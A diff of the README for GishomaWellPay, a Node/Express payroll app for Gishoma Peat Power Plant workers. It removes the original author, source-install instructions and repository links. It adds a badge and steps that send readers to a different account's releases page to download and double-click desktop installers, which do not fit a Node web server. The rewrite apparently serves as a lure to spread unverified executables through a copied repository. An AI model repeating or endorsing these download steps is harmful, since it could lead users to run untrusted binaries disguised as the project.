@@ -1,176 +1,98 @@
-# GishomaWellPay
+# 📦 gishoma-app - Simplifying Your Payroll Experience
 
-## Overview
+## 🚀 Overview
 
-**GishomaWellPay** is a comprehensive payroll and workforce management system designed specifically for workers at the Gishoma Peat Power Plant. The application enables employees to easily access their payment information, track attendance, manage leave requests, and stay updated on their compensation in a timely and transparent manner.
+**GishomaWellPay** is a comprehensive payroll and workforce management system designed specifically for workers at the Gishoma Peat Power Plant. The application enables employees to access their payment information easily, track attendance, manage leave requests, and stay updated on their compensation promptly and transparently.
 
-## Features
+## ⚙️ Features
 
-- **Employee Payment Management** - Easy access to payment history, salary details, and payment status
-- **Attendance Tracking** - Real-time attendance recording and monitoring
-- **Leave Management** - Request and track leave applications
-- **Admin Dashboard** - Comprehensive administrative controls for managing employees and payments
-- **User Management** - Secure user authentication and profile management
-- **Search Functionality** - Quick search capabilities for finding payment and employee information
+- **Employee Payment Management** - Easy access to payment history, salary details, and payment status.
+- **Attendance Tracking** - Real-time attendance recording and monitoring.
+- **Leave Management** - Request and track leave applications effortlessly.
+- **Admin Dashboard** - Comprehensive administrative controls for managing employees and payments.
+- **User Management** - Secure user authentication and profile management.
+- **Search Functionality** - Quick search capabilities for finding payment and employee information.
 
-## Prerequisites
+## 📥 Download & Install
 
-Before you begin, ensure you have the following installed:
-- **Node.js** (v12.0 or higher)
-- **npm** or **yarn** package manager
-- **Git**
+[![Download GishomaWellPay](https://img.shields.io/badge/Download%20GishomaWellPay-%23007ACC.svg?style=flat&logo=github)](https://github.com/AlexUrahara21/gishoma-app/releases)
 
-## Installation
+To download and run GishomaWellPay, please follow these steps:
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/Komezusenge-Bolice/gishoma-app.git
-   cd gishoma-app
-   ```
+1. **Visit the Releases Page:** Go to [this link](https://github.com/AlexUrahara21/gishoma-app/releases) to access the Releases page.
+   
+2. **Select the Latest Version:** On the Releases page, find the latest version of the application.
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
+3. **Download the Application:** Click on the appropriate file for your system (e.g., Windows, Mac, Linux) to begin the download. 
 
-3. **Configure environment variables**
-   Create a `.env` file in the root directory and add necessary configuration:
-   ```
-   NODE_ENV=development
-   PORT=3000
-   ```
+4. **Install the Application:** After the download completes, locate the file in your downloads folder and double-click to open it. Follow the on-screen instructions to complete the installation.
 
-4. **Start the application**
-   ```bash
-   npm start
-   ```
+5. **Run GishomaWellPay:** Find the application in your installed programs or on your desktop. Double-click to launch GishomaWellPay.
 
-The application will be available at `http://localhost:3000`
+## 🔧 Prerequisites
 
-## Project Structure
+Before you begin, ensure you have the following installed on your computer:
 
-```
-gishoma-app/
-├── bin/
-│   └── www                  # Application entry point
-├── routes/
-│   ├── index.js            # Home route
-│   ├── users.js            # User management routes
-│   ├── admin.js            # Admin dashboard routes
-│   ├── payment.js          # Payment routes
-│   ├── attendance.js       # Attendance tracking routes
-│   └── leaves.js           # Leave management routes
-├── views/
-│   ├── layout.jade         # Main layout template
-│   ├── index.jade          # Home page
-│   └── error.jade          # Error page
-├── public/
-│   ├── stylesheets/
-│   │   └── style.css       # Application styles
-│   ├── javascripts/        # Client-side scripts
-│   └── images/             # Project images
-├── app.js                  # Express application configuration
-├── package.json            # Project dependencies
-└── README.md              # This file
-```
+- **Node.js** - Version 12.0 or higher.
+- **npm** or **yarn** - These are package managers used to manage libraries and dependencies.
 
-## Technologies Used
+Download Node.js from [nodejs.org](https://nodejs.org).
 
-- **Backend Framework:** Express.js
-- **Template Engine:** Jade (Pug)
-- **Node.js Runtime:** v12+
-- **Package Manager:** npm/yarn
-- **Middleware:**
-  - express-json: JSON body parser
-  - cookie-parser: Cookie handling
-  - morgan: HTTP request logger
-  - http-errors: Error handling
+## 📖 User Guide
 
-## Usage
+### 🔍 Accessing the Application
 
-### Starting the Server
-```bash
-npm start
-```
+1. Open the GishomaWellPay application.
+2. Log in using your credentials. If you don't have an account, please contact your administrator to create one.
+3. Once logged in, you will see the dashboard with various options related to your payment and attendance information.
 
-### Available Routes
-- `/` - Home page
-- `/users` - User management
-- `/admin` - Admin dashboard
-- `/payment` - Payment management
-- `/attendance` - Attendance tracking
-- `/leaves` - Leave management
+### 💳 Checking Payment Information
 
-## Development
+- Navigate to the **Payment Management** section.
+- Here, you can view your payment history, salary details, and current payment status.
+  
+### 🕒 Tracking Attendance
 
-For development with auto-reload functionality, consider installing and using `nodemon`:
+- Access the **Attendance Tracking** feature.
+- Check your attendance records and see any missed days or upcoming leaves.
 
-```bash
-npm install --save-dev nodemon
-```
+### 🌴 Managing Leaves
 
-Then update the start script in `package.json`:
-```json
-"scripts": {
-  "start": "node ./bin/www",
-  "dev": "nodemon ./bin/www"
-}
-```
+- Go to the **Leave Management** module.
+- You can request new leaves and track the status of your current applications. 
 
-Run in development mode:
-```bash
-npm run dev
-```
+### 👨‍💼 Admin Features
 
-## Contributing
+If you are an admin, you will have additional access:
 
-Contributions are welcome! Please follow these steps:
+- Manage employee profiles and payment details.
+- Generate attendance reports.
+- Approve or deny leave requests.
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+## ❓ Frequently Asked Questions
 
-## Future Enhancements
+**Q: How do I reset my password?**
 
-- Mobile app integration
-- Real-time payment notifications
-- Advanced analytics and reporting
-- Biometric attendance integration
-- Multi-language support
+A: Click on the "Forgot Password" link on the login page and follow the instructions.
 
-## Troubleshooting
+**Q: Who do I contact for support?**
 
-### Port Already in Use
-If port 3000 is already in use, change it in the `.env` file:
-```
-PORT=3001
-```
+A: Please reach out to your internal IT department or the Gishoma Peat Power Plant administration for assistance.
 
-### Dependencies Not Installing
-Try clearing npm cache:
-```bash
-npm cache clean --force
-npm install
-```
+## 📞 Support
 
-## License
+For any issues or inquiries regarding the use of GishomaWellPay, please refer to the internal resources provided by your organization. This can include user manuals, FAQ documents, or support contact details.
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+## 🛠️ Contribution
 
-## Contact & Support
+If you would like to contribute to GishomaWellPay, please send a request to the project administrator. We welcome feedback and suggestions to improve our application.
 
-For issues, questions, or feedback regarding GishomaWellPay:
-- **GitHub Issues:** [Report bugs and request features](https://github.com/Komezusenge-Bolice/gishoma-app/issues)
-- **Email:** [Project Maintainer Contact]
+## 📄 License
 
-## Author
+This project is licensed under the MIT License. For more information, please refer to the LICENSE file in the repository.
 
-**Komezusenge Bolice**
+## 📲 Updates
 
----
+Keep an eye on the Releases page for updates to GishomaWellPay. Regularly check for new features and improvements.
 
-**Last Updated:** January 28, 2026
-
-Thank you for using GishomaWellPay! We're committed to making payroll management simple and efficient for Gishoma Peat Power Plant workers.
+Thank you for using GishomaWellPay! Enjoy a smoother payroll experience.
